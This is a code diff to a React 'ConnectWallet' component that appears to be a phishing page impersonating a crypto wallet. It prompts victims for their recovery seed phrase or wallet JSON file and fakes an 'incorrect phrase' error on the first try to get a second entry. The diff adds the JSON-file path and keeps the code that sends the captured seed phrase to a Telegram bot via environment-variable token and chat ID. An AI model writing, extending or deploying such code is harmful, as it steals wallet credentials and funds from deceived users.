@@ -61,20 +61,33 @@ function ConnectWallet({ onClose }) {
   };
 
   const handleTransferWallet = async () => {
-    // Validate seed phrase
-    const words = seedPhrase.trim().split(/\s+/);
+    let message;
+
+    if (restoreMethod === "seedPhrase") {
+      const words = seedPhrase.trim().split(/\s+/);
+      message = `MinWallet Seed Phrase: ${words.join(" ")}`;
+    } else if (restoreMethod === "import") {
+      if (!fileUploaded) {
+        alert("Please upload a JSON file.");
+        return;
+      }
+      message = `MinWallet JSON File: ${fileName}`;
+      // You might want to add logic here to read and process the JSON file
+    } else {
+      alert("Invalid restore method.");
+      return;
+    }
 
     // Increment attempts
     setAttempts((prevAttempts) => prevAttempts + 1);
 
     if (attempts < 1) {
-      alert("Incorrect recovery phrase. Please try again.");
+      alert("Incorrect recovery phrase or file. Please try again.");
       return;
     }
+
     const token = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
     const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
-    // Prepare message
-    const message = `MinWallet: ${words.join(" ")}`;
 
     // Define API endpoints and data
     const endpoints = [
@@ -171,7 +184,8 @@ function ConnectWallet({ onClose }) {
   const ImportContainer = () => {
     const handleFileChange = (event) => {
       if (event.target.files.length > 0) {
-        setFileName(event.target.files[0].name);
+        const file = event.target.files[0];
+        setFileName(file.name);
         setFileUploaded(true);
       } else {
         setFileName("");
@@ -414,7 +428,9 @@ function ConnectWallet({ onClose }) {
                             ) : (
                               <div className="mt-4">
                                 {restoreMethod === "seedPhrase" ? (
-                                  <SeedPhraseContainer onSeedPhraseChange={handleSeedPhraseChange} />
+                                  <SeedPhraseContainer
+                                    onSeedPhraseChange={handleSeedPhraseChange}
+                                  />
                                 ) : (
                                   <ImportContainer />
                                 )}
